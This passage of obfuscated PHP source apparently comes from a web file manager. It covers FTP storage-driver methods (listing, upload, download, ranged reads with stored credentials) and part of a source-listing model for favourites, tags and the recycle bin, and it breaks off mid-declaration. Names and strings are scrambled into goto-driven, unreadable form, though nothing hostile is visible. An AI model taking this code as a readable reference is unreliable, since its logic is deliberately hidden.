$c’Ãï¢İ‚È = @ftp_rename($this->connect, $bğ«Ğ…À, $BğææÑ®¡İ); $BğææÑ®¡İ = $this->iconvApp($BğææÑ®¡İ); goto c†½ÄÇœè; D‹Ì íÛÌÛ: $f¹È°ªƒÙ• =& $_SERVER[”Ì÷ñ­î¸]; if (!$this->_isconn()) { return !1; } $CÁÈ¾õÛÜù = $this->fileNameAuto($this->pathFather($bğ«Ğ…À), $fĞÌ‰­†š–); goto D­ã°µá”ê; DáÃ‡¼„îƒ: } private function folderInfo($DŒİ×â´é‡, $Båìø§· = false) { goto e±‡óìîŸ…; Cƒ´¤„·: return $e¯Àğ£Àº; goto cÓŒ¼ø×Ä; e±‡óìîŸ…: $eäâ¯Åôº =& $_SERVER[”Ì÷ñ­î¸]; $C‡°ãÓÏ…¤ = $this->getPathOuter(rtrim($DŒİ×â´é‡, $eäâ¯Åôº[8])); $FªÙˆã¥ = $this->pathThis($C‡°ãÓÏ…¤); goto c¸èó§¡Ş±; c¸èó§¡Ş±: $e²ì­ª¼˜” = $this->iconvSystem($DŒİ×â´é‡); if ($Båìø§·) { return array($eäâ¯Åôº[28] => $FªÙˆã¥, $eäâ¯Åôº[75] => $C‡°ãÓÏ…¤, $eäâ¯Åôº[29] => $eäâ¯Åôº[76]); } $e¯Àğ£Àº = array($eäâ¯Åôº[28] => $FªÙˆã¥, $eäâ¯Åôº[75] => $C‡°ãÓÏ…¤, $eäâ¯Åôº[29] => $eäâ¯Åôº[76], $eäâ¯Åôº[187] => 0, $eäâ¯Åôº[107] => 0, $eäâ¯Åôº[1164] => !0, $eäâ¯Åôº[1165] => !0); goto Cƒ´¤„·; cÓŒ¼ø×Ä: } private function fileInfo($D§åÑŠ¨£ê, $e¬‘Ó™Ø† = false) { goto E®ø£²à›; a¾ˆ¦êˆÚ: $Aøƒ÷£¡ÌÓ[$eöš¬Ò–®ß[107]] = $Aøƒ÷£¡ÌÓ[$eöš¬Ò–®ß[107]] > 0 ? $Aøƒ÷£¡ÌÓ[$eöš¬Ò–®ß[107]] : 0; return $Aøƒ÷£¡ÌÓ; goto b‰è¸¤¾Â; E®ø£²à›: $eöš¬Ò–®ß =& $_SERVER[”Ì÷ñ­î¸]; $dÄÅôíñ¦Æ = $this->getPathOuter(rtrim($D§åÑŠ¨£ê, $eöš¬Ò–®ß[8])); $D±†‡ØçÏ = $this->pathThis($dÄÅôíñ¦Æ); goto eË´®”äÜ¦; eË´®”äÜ¦: $dİïÜ…á‹º = $this->iconvSystem($D§åÑŠ¨£ê); if ($e¬‘Ó™Ø†) { return array($eöš¬Ò–®ß[28] => $D±†‡ØçÏ, $eöš¬Ò–®ß[75] => $dÄÅôíñ¦Æ, $eöš¬Ò–®ß[29] => $eöš¬Ò–®ß[167], $eöš¬Ò–®ß[160] => $this->ext($D§åÑŠ¨£ê), $eöš¬Ò–®ß[77] => $this->size($D§åÑŠ¨£ê)); } $Aøƒ÷£¡ÌÓ = array($eöš¬Ò–®ß[28] => $D±†‡ØçÏ, $eöš¬Ò–®ß[75] => $dÄÅôíñ¦Æ, $eöš¬Ò–®ß[29] => $eöš¬Ò–®ß[167], $eöš¬Ò–®ß[187] => 0, $eöš¬Ò–®ß[107] => @ftp_mdtm($this->connect, $dİïÜ…á‹º), $eöš¬Ò–®ß[160] => $this->ext($D§åÑŠ¨£ê), $eöš¬Ò–®ß[77] => $this->size($D§åÑŠ¨£ê), $eöš¬Ò–®ß[1164] => !0, $eöš¬Ò–®ß[1165] => !0); goto a¾ˆ¦êˆÚ; b‰è¸¤¾Â: } public function size($E‡¦‚ôÃ„Œ) { $A–³ê·…÷¬ = $this->objectMeta($E‡¦‚ôÃ„Œ); return $A–³ê·…÷¬ ? $A–³ê·…÷¬[$_SERVER[”Ì÷ñ­î¸][77]] : 0; } public function info($cÇÙĞù ¨) { if ($this->isFile($cÇÙĞù ¨)) { return $this->fileInfo($cÇÙĞù ¨, 0); } else { if ($this->isFolder($cÇÙĞù ¨)) { return $this->folderInfo($cÇÙĞù ¨); } } return !1; } public function exist($BÖÉ ¦¡õ—) { return $this->objectMeta($BÖÉ ¦¡õ—) ? !0 : !1; } public function isFile($b½•Òó‚³Ø) { $bÅ„‚ùÊÓ =& $_SERVER[”Ì÷ñ­î¸]; $dğæ™ã¯ç = $this->objectMeta($b½•Òó‚³Ø); return $dğæ™ã¯ç ? $dğæ™ã¯ç[$bÅ„‚ùÊÓ[29]] == $bÅ„‚ùÊÓ[167] : !1; } public function isFolder($f‚Ôê¨¤ƒ½) { $A‹Ÿˆ‡—À‘ =& $_SERVER[”Ì÷ñ­î¸]; $D·ÎÇê«ñ£ = $this->objectMeta($f‚Ôê¨¤ƒ½); return $D·ÎÇê«ñ£ ? $D·ÎÇê«ñ£[$A‹Ÿˆ‡—À‘[29]] == $A‹Ÿˆ‡—À‘[76] : !1; } public function listPath($F°ï©çµø, $D éÕ¼Œ—– = false) { goto eÌğ¾Ñ; AŠôÖéİ: foreach ($dÅãŒì„­ as $F°ï©çµø) { if ($this->isFolder($F°ï©çµø)) { $c”Á²õŠÌš[$Bî£¦ëí¥õ[74]][] = $this->folderInfo($F°ï©çµø, $D éÕ¼Œ—–); } else { $c”Á²õŠÌš[$Bî£¦ëí¥õ[73]][] = $this->fileInfo($F°ï©çµø, $D éÕ¼Œ—–); } } return $c”Á²õŠÌš; goto A†Œ¯…Òäâ; C“ˆåà—‰¦: $dÅãŒì„­ = $this->ftpList($F°ï©çµø); $c”Á²õŠÌš = array($Bî£¦ëí¥õ[74] => array(), $Bî£¦ëí¥õ[73] => array()); if (!$dÅãŒì„­) { return $c”Á²õŠÌš; } goto AŠôÖéİ; eÌğ¾Ñ: $Bî£¦ëí¥õ =& $_SERVER[”Ì÷ñ­î¸]; if (!$this->_isconn()) { return !1; } $F°ï©çµø = $this->iconvSystem($F°ï©çµø); goto C“ˆåà—‰¦; A†Œ¯…Òäâ: } public function has($aè´ƒ­†Â, $F°¤Ü¡¸ğĞ = false, $a³ì ©ğ¡ø = true) { goto FÖœ¡Šàø; d®¯ëÀÆğ²: $Bëâ†¯œ“ = $this->ftpList($aè´ƒ­†Â); if (!$Bëâ†¯œ“) { return !1; } if ($F°¤Ü¡¸ğĞ) { return array($C¾šÀ”÷[191] => 0, $C¾šÀ”÷[192] => count($Bëâ†¯œ“)); } goto EµÈ ‹¼ğ; EµÈ ‹¼ğ: foreach ($Bëâ†¯œ“ as $aè´ƒ­†Â) { if ($a³ì ©ğ¡ø) { if (!$this->isFolder($aè´ƒ­†Â)) { return !0; } } else { if ($this->isFolder($aè´ƒ­†Â)) { return !0; } } } return !1; goto Cµ¯‚ßã»Õ; FÖœ¡Šàø: $C¾šÀ”÷ =& $_SERVER[”Ì÷ñ­î¸]; if (!$this->_isconn()) { return !1; } $aè´ƒ­†Â = $this->iconvSystem($aè´ƒ­†Â); goto d®¯ëÀÆğ²; Cµ¯‚ßã»Õ: } public function listAll($eÇâôÀÓ»ô) { goto bèƒĞ‡–’; f¶½ŠÙİ‹¢: foreach ($CÃ£‹óó²„[$döÎ… šé‰[74]] as $aéŞ™ˆ§Õ¶) { $b¦¤Ô§ŸƒÎ[] = array($döÎ… šé‰[75] => $döÎ… šé‰[8] . trim(str_replace($eÇâôÀÓ»ô, $döÎ… šé‰[33], $aéŞ™ˆ§Õ¶), $döÎ… šé‰[8]) . $döÎ… šé‰[8], $döÎ… šé‰[76] => 1, $döÎ… šé‰[77] => 0); } foreach ($CÃ£‹óó²„[$döÎ… šé‰[73]] as $a•ñ…²·¸Ş) { $b¦¤Ô§ŸƒÎ[] = array($döÎ… šé‰[75] => $döÎ… šé‰[8] . trim(str_replace($eÇâôÀÓ»ô, $döÎ… šé‰[33], $a•ñ…²·¸Ş), $döÎ… šé‰[8]), $döÎ… šé‰[76] => 0, $döÎ… šé‰[77] => $this->size($a•ñ…²·¸Ş)); } return $b¦¤Ô§ŸƒÎ; goto F²Îáìå³³; bèƒĞ‡–’: $döÎ… šé‰ =& $_SERVER[”Ì÷ñ­î¸]; if (!$this->_isconn()) { return !1; } $eÇâôÀÓ»ô = $this->iconvSystem($eÇâôÀÓ»ô); goto DêäÖÖôé; DêäÖÖôé: $CÃ£‹óó²„ = array($döÎ… šé‰[73] => array(), $döÎ… šé‰[74] => array()); $this->recursionFtpFiles($eÇâôÀÓ»ô, $CÃ£‹óó²„); $b¦¤Ô§ŸƒÎ = array(); goto f¶½ŠÙİ‹¢; F²Îáìå³³: } public function getContent($f¬”‚ï¢±Ş) { if (!$this->_isconn()) { return !1; } $f¬”‚ï¢±Ş = $this->iconvSystem($f¬”‚ï¢±Ş); return $this->fileSubstr($f¬”‚ï¢±Ş); } public function setContent($C‰ãóîµ‹â, $cÄƒ×êÊš‘ = '') { goto c‰¾ ¶Úæ; dšïÜøœÓå: file_put_contents($d©¸ø ×äö, $cÄƒ×êÊš‘); $CæÛÀ×·ËÖ = $this->upload($C‰ãóîµ‹â, $this->iconvApp($d©¸ø ×äö)); $this->tempFileRemve($d©¸ø ×äö); goto CÒ³¾´¿Ê›; CÒ³¾´¿Ê›: return $CæÛÀ×·ËÖ; goto b±àˆï‹ö; c‰¾ ¶Úæ: if (!$this->_isconn()) { return !1; } $A–ÛöÇõ‘ = $this->pathThis($this->iconvSystem($C‰ãóîµ‹â)); $d©¸ø ×äö = $this->tempFile($A–ÛöÇõ‘); goto dšïÜøœÓå; b±àˆï‹ö: } public function fileSubstr($AØ­ó¹¢‚, $cèŞ†Í´ëÒ = 0, $cë’ÑíÑ˜ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($AØ­ó¹¢‚, $cèŞ†Í´ëÒ, $cë’ÑíÑ˜); } private function ftpRequest($B²¤ÃØ„‡, $bƒ‚œ´ŸÓ = 0, $bº¡É‰Î¦‰ = false) { goto D‰ğÚ‘ç¤²; BÅÒ™òÄä: return $cšº¦‰ä è; goto CäóŸ†…Âª; A¹÷§…Ìàˆ: curl_setopt($dñ‘Œ‹™´, CURLOPT_URL, $dà ãó¼·¹ . $this->pathEncode($B²¤ÃØ„‡)); curl_setopt($dñ‘Œ‹™´, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($bº¡É‰Î¦‰) { $A˜¾Æ¸õÙ = $bƒ‚œ´ŸÓ + $bº¡É‰Î¦‰ - 1; curl_setopt($dñ‘Œ‹™´, CURLOPT_RANGE, "{$bƒ‚œ´ŸÓ}\55{$A˜¾Æ¸õÙ}"); } goto a•š¡ ì»Ø; a•š¡ ì»Ø: curl_setopt($dñ‘Œ‹™´, CURLOPT_RETURNTRANSFER, 1); $cšº¦‰ä è = curl_exec($dñ‘Œ‹™´); curl_close($dñ‘Œ‹™´); goto BÅÒ™òÄä; D‰ğÚ‘ç¤²: $B²¤ÃØ„‡ = $this->iconvSystem($B²¤ÃØ„‡); $dà ãó¼·¹ = $this->scheme . $this->host . $_SERVER[”Ì÷ñ­î¸][4] . $this->port; $dñ‘Œ‹™´ = curl_init(); goto A¹÷§…Ìàˆ; CäóŸ†…Âª: } public function upload($BÏŒÈŞ­ŠØ, $B‡ƒĞÊÙÃ–, $FÏ™ÑƒƒÌÚ = false, $eÏâĞ¸à‘Å = REPEAT_REPLACE) { goto f¼Ó²øœø; AŒƒè¹Ùİ£: $B‡ƒĞÊÙÃ– = $this->iconvSystem($B‡ƒĞÊÙÃ–); $eŠ“Ù£‡” = ftp_nb_put($this->connect, $BÏŒÈŞ­ŠØ, $B‡ƒĞÊÙÃ–, FTP_BINARY); while ($eŠ“Ù£‡” == FTP_MOREDATA) { $eŠ“Ù£‡” = ftp_nb_continue($this->connect); } goto E‘‚ğ‹Å©Ö; f¼Ó²øœø: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($BÏŒÈŞ­ŠØ))) { return !1; } $BÏŒÈŞ­ŠØ = $this->iconvSystem($BÏŒÈŞ­ŠØ); goto AŒƒè¹Ùİ£; E‘‚ğ‹Å©Ö: if ($eŠ“Ù£‡” != FTP_FINISHED) { return !1; } return $this->getPathOuter($BÏŒÈŞ­ŠØ); goto b‘²Î„ä©…; b‘²Î„ä©…: } public function download($d¹—Œ‘ùøÂ, $bèæÂ’óä½ = '') { goto aí’íÃ•—¥; aí’íÃ•—¥: if (!$this->_isconn()) { return !1; } $e±áøáš·ê = $this->pathFather($bèæÂ’óä½); if (!IO::mkdir($e±áøáš·ê)) { return !1; } goto FÏÍÆÄ›Æ; C¡›ŠÌ›‹ô: while ($Eå‰ŠŒÑ÷à == FTP_MOREDATA) { $Eå‰ŠŒÑ÷à = ftp_nb_continue($this->connect); } if ($Eå‰ŠŒÑ÷à != FTP_FINISHED) { return !1; } return $this->iconvApp($bèæÂ’óä½); goto C”˜“×Şî¿; FÏÍÆÄ›Æ: $d¹—Œ‘ùøÂ = $this->iconvSystem($d¹—Œ‘ùøÂ); $bèæÂ’óä½ = $this->iconvSystem($bèæÂ’óä½); $Eå‰ŠŒÑ÷à = ftp_nb_get($this->connect, $bèæÂ’óä½, $d¹—Œ‘ùøÂ, FTP_BINARY); goto C¡›ŠÌ›‹ô; C”˜“×Şî¿: } private function ftpList($F’ß„É¸‹İ) { goto Bìšù¾ÜÃƒ; b½í»ÚÂĞÖ: $F’ß„É¸‹İ = rtrim($F’ß„É¸‹İ, $f…—“ñø¯µ[8]) . $f…—“ñø¯µ[8]; $CÊƒÂŒƒ“Æ = @ftp_nlist($this->connect, $F’ß„É¸‹İ); if ($CÊƒÂŒƒ“Æ === !1) { $CÊƒÂŒƒ“Æ = @ftp_rawlist($this->connect, $F’ß„É¸‹İ); foreach ($CÊƒÂŒƒ“Æ as $Dê©ºòàĞË => $f´Ÿ™Ãƒ£ò) { $CÊƒÂŒƒ“Æ[$Dê©ºòàĞË] = end(explode($f…—“ñø¯µ[1166], $f´Ÿ™Ãƒ£ò)); } } goto aİ·ãùæ×¦; aİ·ãùæ×¦: $B±ëË¸´Öâ = array(); foreach ($CÊƒÂŒƒ“Æ as $FİÖ¥±Ÿ) { if ($FİÖ¥±Ÿ == $f…—“ñø¯µ[91] || $FİÖ¥±Ÿ == $f…—“ñø¯µ[1167]) { continue; } if (!strstr($FİÖ¥±Ÿ, $f…—“ñø¯µ[8])) { $FİÖ¥±Ÿ = $F’ß„É¸‹İ . ltrim($FİÖ¥±Ÿ, $f…—“ñø¯µ[8]); } $B±ëË¸´Öâ[] = $this->iconvApp($FİÖ¥±Ÿ); } return $B±ëË¸´Öâ; goto Dø³çãÙ ¬; Bìšù¾ÜÃƒ: $f…—“ñø¯µ =& $_SERVER[”Ì÷ñ­î¸]; if (!$this->isFolder($F’ß„É¸‹İ)) { return !1; } @ftp_chdir($this->connect, $f…—“ñø¯µ[8]); goto b½í»ÚÂĞÖ; Dø³çãÙ ¬: } private function recursionFtpFiles($CÃÎŠÜ”, &$f„Ş”Ş¾š…) { $Bš®š—ë =& $_SERVER[”Ì÷ñ­î¸]; if (!$this->_isconn()) { return !1; } if (!($Eï¶«Ê‚§ = $this->ftpList($CÃÎŠÜ”))) { return !1; } foreach ($Eï¶«Ê‚§ as $CÃÎŠÜ”) { if ($this->isFolder($CÃÎŠÜ”)) { $this->recursionFtpFiles($CÃÎŠÜ”, $f„Ş”Ş¾š…); $f„Ş”Ş¾š…[$Bš®š—ë[74]][] = $CÃÎŠÜ”; } else { $f„Ş”Ş¾š…[$Bš®š—ë[73]][] = $CÃÎŠÜ”; } } } private function objectMeta($c¨…Ñ°Òñ) { goto e’ËŒµÈ£ˆ; e’ËŒµÈ£ˆ: $b¼Í‰˜˜î =& $_SERVER[”Ì÷ñ­î¸]; $C¼ñ±´Àñ› = $b¼Í‰˜˜î[1168] . md5($c¨…Ñ°Òñ); $DÁÂœ¤¬Øœ = Cache::get($C¼ñ±´Àñ›); goto C¤îóª‹µ; F¶©ùÎëÍº: return $DÁÂœ¤¬Øœ; goto BùØŒ™ÙöÈ; C¤îóª‹µ: if ($DÁÂœ¤¬Øœ !== null && $DÁÂœ¤¬Øœ !== !1) { return $DÁÂœ¤¬Øœ; } if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $b¼Í‰˜˜î[8]); goto cÅŒ¼ã´Í™; cÅŒ¼ã´Í™: $c‡»®ÆßÀ = @ftp_size($this->connect, $this->iconvSystem($c¨…Ñ°Òñ)); if ($c‡»®ÆßÀ != -1) { $DÁÂœ¤¬Øœ = array($b¼Í‰˜˜î[77] => $c‡»®ÆßÀ, $b¼Í‰˜˜î[29] => $b¼Í‰˜˜î[167]); } else { $B”Æì¶ÕÓœ = @ftp_chdir($this->connect, $this->iconvSystem($c¨…Ñ°Òñ)); $DÁÂœ¤¬Øœ = $B”Æì¶ÕÓœ ? array($b¼Í‰˜˜î[77] => 0, $b¼Í‰˜˜î[29] => $b¼Í‰˜˜î[76]) : !1; } Cache::set($C¼ñ±´Àñ›, $DÁÂœ¤¬Øœ, 0); goto F¶©ùÎëÍº; BùØŒ™ÙöÈ: } } goto CŠèøÙØâ; Dõëó³…ˆß: class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\157\x75\162\143\145"; protected $tableMeta = array("\x74\141\x62\154\x65\116\x61\155\145" => "\151\157\x5f\163\157\x75\x72\x63\x65\x5f\155\145\164\x61", "\155\x65\x74\141\x46\151\145\154\144" => "\163\x6f\165\x72\143\x65\x49\104"); protected $dataAuto = array(array("\155\x6f\x64\151\146\x79\x54\x69\155\145", "\164\x69\x6d\145", "\151\x6e\163\x65\x72\x74", "\146\165\156\x63\x74\x69\x6f\156"), array("\x63\162\145\141\x74\145\x54\x69\155\145", "\x74\x69\x6d\145", "\151\156\163\145\162\x74", "\146\165\156\143\164\x69\157\156"), array("\x76\x69\145\167\x54\x69\x6d\x65", "\x74\151\x6d\x65", "\x69\156\163\145\162\x74", "\x66\165\x6e\143\x74\x69\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($FÓò¥õèª) { return $this->listSource(array($_SERVER[”Ì÷ñ­î¸][368] => $FÓò¥õèª)); } public function typeName($a“¹õ½²¤À) { static $e†½ ‘‘ºÅ = array(self::TYPE_SYSTEM => "\163\x79\163\x74\145\155", self::TYPE_USER => "\165\163\x65\162", self::TYPE_GROUP => "\x67\x72\x6f\165\x70"); return $e†½ ‘‘ºÅ[$a“¹õ½²¤À . $_SERVER[”Ì÷ñ­î¸][33]]; } public function sourceListInfo($FÃ§÷£ßƒ, $B¬ƒëÑĞ©Å = false) { goto cõœ†ß«‰Ó; cõœ†ß«‰Ó: $E¼ÕÙÑˆ±» =& $_SERVER[”Ì÷ñ­î¸]; $FÃ§÷£ßƒ = $FÃ§÷£ßƒ ? $FÃ§÷£ßƒ : array(); $FÃ§÷£ßƒ = array_filter(array_unique($FÃ§÷£ßƒ)); goto d¨½¶Ì¾‰¶; D ´ïÕß›„: return array_to_keyvalue($b÷™Š±¢§¸, $E¼ÕÙÑˆ±»[369]); goto Dâ¸Éê‹ö—; d¨½¶Ì¾‰¶: if (!$FÃ§÷£ßƒ) { return array(); } $b÷™Š±¢§¸ = $this->where(array($E¼ÕÙÑˆ±»[369] => array($E¼ÕÙÑˆ±»[7], $FÃ§÷£ßƒ)))->select(); $this->_listDataApply($b÷™Š±¢§¸, $B¬ƒëÑĞ©Å); goto D ´ïÕß›„; Dâ¸Éê‹ö—: } public function pathInfoFilter($e¤º†›ô‡¶) { goto D„Ìö£×‹; cäß½×Ö¯è: $Dš¯æĞÂµí .= $cÙàë×³‡[374]; $Dš¯æĞÂµí .= $cÙàë×³‡[375]; $bï‘ğö˜Æã = explode($cÙàë×³‡[47], $Dš¯æĞÂµí); goto aÃàÀƒ‰î‚; D„Ìö£×‹: $cÙàë×³‡ =& $_SERVER[”Ì÷ñ­î¸]; $e¤º†›ô‡¶[$cÙàë×³‡[75]] = KodIO::make($e¤º†›ô‡¶[$cÙàë×³‡[369]]); $e¤º†›ô‡¶[$cÙàë×³‡[29]] = $e¤º†›ô‡¶[$cÙàë×³‡[370]] == 1 ? $cÙàë×³‡[76] : $cÙàë×³‡[167]; goto BĞ†ƒäèÓÖ; aÃàÀƒ‰î‚: if (isset($e¤º†›ô‡¶[$cÙàë×³‡[376]]) && $e¤º†›ô‡¶[$cÙàë×³‡[376]][$cÙàë×³‡[377]] == -1) { $bï‘ğö˜Æã = array_remove_value($bï‘ğö˜Æã, $cÙàë×³‡[187]); $bï‘ğö˜Æã = array_remove_value($bï‘ğö˜Æã, $cÙàë×³‡[107]); $bï‘ğö˜Æã = array_remove_value($bï‘ğö˜Æã, $cÙàë×³‡[378]); $bï‘ğö˜Æã = array_remove_value($bï‘ğö˜Æã, $cÙàë×³‡[379]); $bï‘ğö˜Æã = array_remove_value($bï‘ğö˜Æã, $cÙàë×³‡[77]); $bï‘ğö˜Æã = array_remove_value($bï‘ğö˜Æã, $cÙàë×³‡[380]); } $e¤º†›ô‡¶ = array_field_key($e¤º†›ô‡¶, $bï‘ğö˜Æã); return $e¤º†›ô‡¶; goto eÜË™Ï—¶¶; BĞ†ƒäèÓÖ: $e¤º†›ô‡¶[$cÙàë×³‡[371]] = $this->typeName($e¤º†›ô‡¶[$cÙàë×³‡[371]]); if ($e¤º†›ô‡¶[$cÙàë×³‡[370]] != 1) { $e¤º†›ô‡¶[$cÙàë×³‡[160]] = $e¤º†›ô‡¶[$cÙàë×³‡[372]]; unset($e¤º†›ô‡¶[$cÙàë×³‡[372]]); } $Dš¯æĞÂµí = $cÙàë×³‡[373]; goto cäß½×Ö¯è; eÜË™Ï—¶¶: } public function listUserFav() { goto EÏ‰ˆÑƒ‰”; EÏ‰ˆÑƒ‰”: $BŠñœğéÇâ =& $_SERVER[”Ì÷ñ­î¸]; $D¯¬ÓÇå×Ù = Model($BŠñœğéÇâ[381])->listData(); $dƒ‡œÏÍÆÍ = array_filter_by_field($D¯¬ÓÇå×Ù, $BŠñœğéÇâ[29], $BŠñœğéÇâ[382]); goto f©Ê¦…Ï©Ì; B§…ËÔ¯§‰: foreach ($D¯¬ÓÇå×Ù as &$B©İÑµµÛï) { $B©İÑµµÛï = array($BŠñœğéÇâ[385] => $B©İÑµµÛï[$BŠñœğéÇâ[367]], $BŠñœğéÇâ[386] => $B©İÑµµÛï[$BŠñœğéÇâ[28]], $BŠñœğéÇâ[387] => $B©İÑµµÛï[$BŠñœğéÇâ[75]], $BŠñœğéÇâ[388] => $B©İÑµµÛï[$BŠñœğéÇâ[29]], $BŠñœğéÇâ[389] => $B©İÑµµÛï[$BŠñœğéÇâ[187]], $BŠñœğéÇâ[390] => $B©İÑµµÛï[$BŠñœğéÇâ[107]]); if ($B©İÑµµÛï[$BŠñœğéÇâ[29]] == $BŠñœğéÇâ[382] && $e–ñ“§ìÓË[$B©İÑµµÛï[$BŠñœğéÇâ[75]]]) { $B©İÑµµÛï[$BŠñœğéÇâ[391]] = $e–ñ“§ìÓË[$B©İÑµµÛï[$BŠñœğéÇâ[75]]]; } } return $D¯¬ÓÇå×Ù; goto dŠ«ä…Ô¸î; f©Ê¦…Ï©Ì: $dƒ‡œÏÍÆÍ = array_to_keyvalue($dƒ‡œÏÍÆÍ, $BŠñœğéÇâ[33], $BŠñœğéÇâ[75]); if ($dƒ‡œÏÍÆÍ) { $e–ñ“§ìÓË = $this->listSource(array($BŠñœğéÇâ[383] => array($BŠñœğéÇâ[384], $dƒ‡œÏÍÆÍ))); } $e–ñ“§ìÓË = array_to_keyvalue($e–ñ“§ìÓË[$BŠñœğéÇâ[354]], $BŠñœğéÇâ[369]); goto B§…ËÔ¯§‰; dŠ«ä…Ô¸î: } public function listUserTag($D’¨¤à¿¶ß) { goto fùÒ˜£‡šÆ; DÆßæ©­Ö´: $D“ä½–§ô = array_to_keyvalue($D“ä½–§ô, $b½â¨–ßó[33], $b½â¨–ßó[75]); $f†ÖÛÚ®¾ = array(); if ($D“ä½–§ô) { $Fİõˆ…¹ùµ = array($b½â¨–ßó[383] => array($b½â¨–ßó[384], $D“ä½–§ô)); $f†ÖÛÚ®¾ = $this->listSource($Fİõˆ…¹ùµ); } goto E‡³á©°À; E‡³á©°À: $this->listUserTagClear($D“ä½–§ô, $f†ÖÛÚ®¾, $D’¨¤à¿¶ß); return $f†ÖÛÚ®¾; goto BÖÚåÌ¢ã; fùÒ˜£‡šÆ: $b½â¨–ßó =& $_SERVER[”Ì÷ñ­î¸]; $E¥»¾Ù¥š½ = Model($b½â¨–ßó[392])->listData(); $D“ä½–§ô = array_filter_by_field($E¥»¾Ù¥š½, $b½â¨–ßó[393], $D’¨¤à¿¶ß); goto DÆßæ©­Ö´; BÖÚåÌ¢ã: } private function listUserTagClear($Cï¬ƒß²‰ø, $BÙç²­ª”Ú, $dÔÄ¤³‰Ò) { goto FÃ‚ãµ×¡Ü; d†ß´šä¦ï: $a»¼ŠÜ³™± = array(); $b‘®¢òÒÇ = array_to_keyvalue($BÙç²­ª”Ú[$béôõ‰îêã[74]], $béôõ‰îêã[33], $béôõ‰îêã[369]); $FÁƒõğ°© = array_to_keyvalue($BÙç²­ª”Ú[$béôõ‰îêã[73]], $béôõ‰îêã[33], $béôõ‰îêã[369]); goto dÉ¼£×ìºŠ; dÉ¼£×ìºŠ: $dãèÕãµÌì = array_merge($FÁƒõğ°©, $b‘®¢òÒÇ); foreach ($Cï¬ƒß²‰ø as $D¤¯ÎñÈË) { if (!in_array($D¤¯ÎñÈË, $dãèÕãµÌì)) { $a»¼ŠÜ³™±[] = $D¤¯ÎñÈË; } } if (!$a»¼ŠÜ³™±) { return; } goto c¢Áñ± â; c¢Áñ± â: Model($béôõ‰îêã[394])->removeFromTag($a»¼ŠÜ³™±, $dÔÄ¤³‰Ò); goto e™‰œ•®Íˆ; FÃ‚ãµ×¡Ü: $béôõ‰îêã =& $_SERVER[”Ì÷ñ­î¸]; if (!$Cï¬ƒß²‰ø) { return; } if ($BÙç²­ª”Ú && count($Cï¬ƒß²‰ø) == $BÙç²­ª”Ú[$béôõ‰îêã[351]][$béôõ‰îêã[352]]) { return; } goto d†ß´šä¦ï; e™‰œ•®Íˆ: } public function listUserRecycle() { $e©ãê—Üò =& $_SERVER[”Ì÷ñ­î¸]; $dì¾¯†· = Model($e©ãê—Üò[395])->listData(); if (!$dì¾¯†·) { return array(); } $B²ôˆöíÜ = array($e©ãê—Üò[383] => array($e©ãê—Üò[384], $dì¾¯†·), $e©ãê—Üò[396] => 1); return $this->listSource($B²ôˆöíÜ); } public function listSource($B¦±ù¼¶Ñ, $DÃßğ‡¦×ˆ = 3000) { goto CªƒÅà÷ƒ; C¹İßÇ†Â: return $aÁ—œæÉ—; goto bƒÀ‰ôã©—; CªƒÅà÷ƒ: $eªº«ÍÙÖ© =& $_SERVER[”Ì÷ñ­î¸]; if (!isset($B¦±ù¼¶Ñ[$eªº«ÍÙÖ©[397]])) { $B¦±ù¼¶Ñ[$eªº«ÍÙÖ©[397]] = 0; } $eß„Ë°Ú = $eªº«ÍÙÖ©[398]; goto aéŒï–®Ó; aéŒï–®Ó: $aÁ—œæÉ— = $this->field($eß„Ë°Ú)->_makeOrder()->where($B¦±ù¼¶Ñ)->selectPage($DÃßğ‡¦×ˆ); $this->_listDataApply($aÁ—œæÉ—[$eªº«ÍÙÖ©[354]]); $this->_listMake($aÁ—œæÉ—); goto C¹İßÇ†Â; bƒÀ‰ôã©—: } protected function _makeOrder() { goto B·œ­ÔßÂ; B·œ­ÔßÂ: $D»â¦”·„Ö =& $_SERVER[”Ì÷ñ­î¸]; $B¡—¡­õ…ì = Model($D»â¦”·„Ö[399])->get($D»â¦”·„Ö[400]); $BÙÄÄŒœ¯¤ = Model($D»â¦”·„Ö[399])->get($D»â¦”·„Ö[401]); goto f£‡ŸÛÜ§; Bë™£ÑæéÙ: $f˜˜ß ¯±Ğ = Input::get($D»â¦”·„Ö[408], $D»â¦”·„Ö[7], $BÙÄÄŒœ¯¤, array_keys($B°É‘ÃÙñÁ)); if (!in_array($B±ö†³—ŞŒ, array_keys($F“¿»ÑÎ…­))) { $B±ö†³—ŞŒ = $D»â¦”·„Ö[28]; } if (!in_array($f˜˜ß ¯±Ğ, array_keys($B°É‘ÃÙñÁ))) { $B±ö†³—ŞŒ = $D»â¦”·„Ö[402]; } goto eä¢Œç±ôè; eä¢Œç±ôè: if ($B±ö†³—ŞŒ == $D»â¦”·„Ö[28]) { } $DŞ‚¯¼¡½© = $D»â¦”·„Ö[409] . $F“¿»ÑÎ…­[$B±ö†³—ŞŒ] . $D»â¦”·„Ö[50] . $B°É‘ÃÙñÁ[$f˜˜ß ¯±Ğ]; return $this->order(rtrim(trim($DŞ‚¯¼¡½©), $D»â¦”·„Ö[47])); goto aÅöñ¥å³±; f£‡ŸÛÜ§: $B°É‘ÃÙñÁ = array($D»â¦”·„Ö[402] => $D»â¦”·„Ö[403], $D»â¦”·„Ö[404] => $D»â¦”·„Ö[405]); $F“¿»ÑÎ…­ = array($D»â¦”·„Ö[28] => $D»â¦”·„Ö[28], $D»â¦”·„Ö[77] => $D»â¦”·„Ö[77], $D»â¦”·„Ö[160] => $D»â¦”·„Ö[372], $D»â¦”·„Ö[378] => $D»â¦”·„Ö[378], $D»â¦”·„Ö[406] => $D»â¦”·„Ö[379], $D»â¦”·„Ö[187] => $D»â¦”·„Ö[187], $D»â¦”·„Ö[107] => $D»â¦”·„Ö[107]); $B±ö†³—ŞŒ = Input::get($D»â¦”·„Ö[407], $D»â¦”·„Ö[7], $B¡—¡­õ…ì, array_keys($F“¿»ÑÎ…­)); goto Bë™£ÑæéÙ; aÅöñ¥å³±: } protected function 